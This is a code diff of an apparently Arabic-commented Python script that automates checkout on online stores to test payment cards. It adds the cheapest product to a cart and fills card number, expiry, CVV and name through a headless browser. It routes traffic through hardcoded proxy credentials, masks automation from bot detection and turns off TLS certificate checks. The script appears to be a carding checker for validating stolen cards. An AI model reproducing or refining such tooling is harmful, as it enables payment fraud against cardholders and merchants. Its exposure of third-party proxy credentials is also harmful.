@@ -35,36 +35,20 @@ PROXY_PASS = "i67s60ep"
 PROXY_IP = "px440401.pointtoserver.com"
 PROXY_PORT = "10780"
 
-# بروكسيات احتياطية
-BACKUP_PROXIES = [
-    {"ip": "px440401.pointtoserver.com", "port": "10780", "user": "purevpn0s8732217", "pass": "i67s60ep"},
-    {"ip": "proxy1.someproxy.com", "port": "8080", "user": "user1", "pass": "pass1"},
-]
-
 def get_proxy_options():
-    """إعدادات البروكسي لـ Selenium Wire"""
+    """إعدادات البروكسي لـ Selenium Wire مع دعم HTTPS"""
     proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_IP}:{PROXY_PORT}"
     return {
         "proxy": {
             "http": proxy_url,
             "https": proxy_url,
             "no_proxy": "localhost,127.0.0.1"
-        }
+        },
+        "verify_ssl": False,
+        "suppress_connection_errors": True
     }
 
-def get_backup_proxy_options():
-    """إعدادات بروكسي احتياطي"""
-    for proxy in BACKUP_PROXIES:
-        proxy_url = f"http://{proxy['user']}:{proxy['pass']}@{proxy['ip']}:{proxy['port']}"
-        yield {
-            "proxy": {
-                "http": proxy_url,
-                "https": proxy_url,
-                "no_proxy": "localhost,127.0.0.1"
-            }
-        }
-
-def create_driver(proxy_options=None, use_fallback=False):
+def create_driver(use_proxy=True):
     """إنشاء متصفح مع أو بدون بروكسي"""
     chrome_options = Options()
     chrome_options.add_argument('--headless')
@@ -79,14 +63,13 @@ def create_driver(proxy_options=None, use_fallback=False):
     chrome_options.add_argument('--disable-gpu')
     chrome_options.add_argument('--disable-notifications')
     chrome_options.add_argument('--disable-extensions')
-    
-    # إضافات لتجنب الكشف
+    chrome_options.add_argument('--ignore-certificate-errors')
+    chrome_options.add_argument('--allow-running-insecure-content')
     chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-    chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
-    chrome_options.add_experimental_option('useAutomationExtension', False)
     
-    if proxy_options:
+    if use_proxy:
         try:
+            proxy_options = get_proxy_options()
             driver = webdriver.Chrome(
                 options=chrome_options,
                 seleniumwire_options=proxy_options
@@ -94,9 +77,7 @@ def create_driver(proxy_options=None, use_fallback=False):
             return driver
         except Exception as e:
             logger.warning(f"⚠️ فشل البروكسي: {e}")
-            if use_fallback:
-                return webdriver.Chrome(options=chrome_options)
-            raise
+            return webdriver.Chrome(options=chrome_options)
     
     return webdriver.Chrome(options=chrome_options)
 
@@ -156,7 +137,7 @@ def ff(ccx, site):
             'service', 'guarantee', 'support'
         ]
         
-        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
+        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10, verify=False)
         if r.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to fetch products"}
         
@@ -195,51 +176,21 @@ def ff(ccx, site):
         variant_id = cheapest['variant_id']
         total_amount = f"${cheapest['price']:.2f}"
         
-        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
+        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10, verify=False)
         if resp.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to add to cart"}
         
-        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
+        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10, verify=False)
         checkout_url = response.url
         
     except Exception as e:
         return {"success": False, "code": None, "error": str(e)}
     
-    # ==================== 2. تشغيل المتصفح (مع محاولة بروكسيات متعددة) ====================
+    # ==================== 2. تشغيل المتصفح ====================
     driver = None
-    driver_created = False
-    
-    # محاولة 1: البروكسي الأساسي
     try:
-        logger.info("🔄 محاولة استخدام البروكسي الأساسي...")
-        proxy_options = get_proxy_options()
-        driver = create_driver(proxy_options, use_fallback=True)
-        driver_created = True
-    except Exception as e:
-        logger.warning(f"⚠️ فشل البروكسي الأساسي: {e}")
-    
-    # محاولة 2: بروكسيات احتياطية
-    if not driver_created:
-        for i, backup_proxy in enumerate(get_backup_proxy_options()):
-            try:
-                logger.info(f"🔄 محاولة استخدام البروكسي الاحتياطي {i+1}...")
-                driver = create_driver(backup_proxy, use_fallback=True)
-                driver_created = True
-                break
-            except Exception as e:
-                logger.warning(f"⚠️ فشل البروكسي الاحتياطي {i+1}: {e}")
-    
-    # محاولة 3: بدون بروكسي
-    if not driver_created:
-        try:
-            logger.info("🔄 محاولة بدون بروكسي...")
-            driver = create_driver(None, use_fallback=True)
-            driver_created = True
-        except Exception as e:
-            logger.error(f"❌ فشل جميع المحاولات: {e}")
-            return {"success": False, "code": None, "error": str(e)}
-    
-    try:
+        logger.info("🔄 محاولة استخدام البروكسي...")
+        driver = create_driver(use_proxy=True)
         driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
         wait = WebDriverWait(driver, 15)
         driver.set_page_load_timeout(25)
@@ -297,8 +248,8 @@ def ff(ccx, site):
             driver.execute_script("arguments[0].click();", continue_btn)
             time.sleep(4)
             
-        except:
-            return {"success": False, "code": None, "error": "Shipping fill failed"}
+        except Exception as e:
+            return {"success": False, "code": None, "error": f"Shipping fill failed: {str(e)}"}
         
         # ==================== 4. تعبئة الدفع ====================
         try:
@@ -383,8 +334,8 @@ def ff(ccx, site):
             if not (card_filled and expiry_filled and cvv_filled and name_filled):
                 return {"success": False, "code": None, "error": "Payment fill failed"}
             
-        except:
-            return {"success": False, "code": None, "error": "Payment error"}
+        except Exception as e:
+            return {"success": False, "code": None, "error": f"Payment error: {str(e)}"}
         
         # ==================== 5. اعتراض GraphQL ====================
         try:
